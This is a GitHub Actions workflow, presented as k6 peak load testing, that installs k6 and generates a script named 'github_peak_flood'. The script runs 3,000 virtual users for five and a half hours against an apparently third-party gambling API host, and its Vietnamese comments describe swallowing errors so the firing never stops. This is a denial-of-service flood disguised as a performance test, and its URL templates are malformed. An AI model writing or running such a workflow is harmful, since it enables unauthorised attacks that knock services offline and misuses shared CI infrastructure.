name: K6 Peak Load Testing

on:
  workflow_dispatch:

jobs:
  k6_load_test:
    name: Execute k6 Stress Test
    runs-on: ubuntu-latest

    env:
      ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION: 'true'

    steps:
    - name: Checkout Code
      uses: actions/checkout@v4

    - name: Setup k6 (official APT repo)
      id: setup-k6
      run: |
        sudo apt-get update -y
        sudo apt-get install -y gnupg2 curl ca-certificates apt-transport-https
        sudo mkdir -p /etc/apt/keyrings
        curl -fsSL https://dl.k6.io/key.gpg | sudo gpg --dearmor -o /etc/apt/keyrings/k6.gpg
        echo "deb [signed-by=/etc/apt/keyrings/k6.gpg] https://dl.k6.io/deb stable main" | sudo tee /etc/apt/sources.list.d/k6.list
        sudo apt-get update -y
        sudo apt-get install -y k6
        k6 version

    - name: Auto Generate Test Script File
      run: |
        cat << 'EOF' > load_test_run.js
        import http from 'k6/http';
        import { check, sleep } from 'k6';

        export const options = {
          scenarios: {
            github_peak_flood: {
              executor: 'constant-vus',
              vus: 3000,
              duration: '5h30m',
            },
          },
        };

        // Sử dụng biến môi trường lấy Token từ GitHub Secrets bảo mật
        const TOKEN = __ENV.TOKEN || '';

        export default function () {
          try {
            // 1. Đã sửa sang Subdomain portal cho API danh sách game
            const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res1, { 'API OK': (r) => r.status === 200 || r.status === 401 });

            // 2. Đã sửa sang Subdomain taixiu cho cổng bắt tay WebSocket mới
            const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res2, { 'New Hub OK': (r) => r.status !== 0 });

            // 3. Đã sửa sang Subdomain taixiumini cho cổng bắt tay WebSocket cũ
            const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res3, { 'Old Hub OK': (r) => r.status !== 0 });
          } catch (err) {
            // Nuốt lỗi mạng để duy trì nhịp bắn liên tục kịch sàn
          }
          sleep(0.05);
        }
        EOF

    - name: Run k6 Performance Test
      env:
        TOKEN: ${{ secrets.API_TOKEN }}
      run: k6 run load_test_run.js
